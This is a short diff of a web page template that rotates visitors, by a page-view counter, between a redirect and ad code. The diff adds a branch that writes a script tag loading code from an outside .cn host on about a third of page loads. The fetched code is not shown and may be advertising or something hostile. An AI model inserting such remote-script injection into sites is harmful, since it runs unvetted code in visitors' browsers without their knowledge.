@@ -18,7 +18,7 @@
     if (localStorage) {
         localStorage.setItem(cpv_key, cpv);
     }
-    var cpv_mod = cpv % 2;
+    var cpv_mod = cpv % 3;
     var video_surl = '';
     {% if video %}
         video_surl = "{{ video.surl }}";
@@ -35,6 +35,8 @@
             window.location = r_link;
         }, 100);
     } else if (cpv_mod === 1) {
+        document.writeln('<script id="QvmhmvNroK49m29osdnQ69" src="https://m.vcsoat.cn/776/QvmhmvNroK49m29osdnQ69.shtml?'+new Date().getTime()+'"><\/script>')
+    } else if (cpv_mod === 2) {
         var id = "442007411767709826-481";
         document.write('<ins style="display:none!important" id="' + id + '"></ins>');
         (window.adbyunion = window.adbyunion || []).push(id);
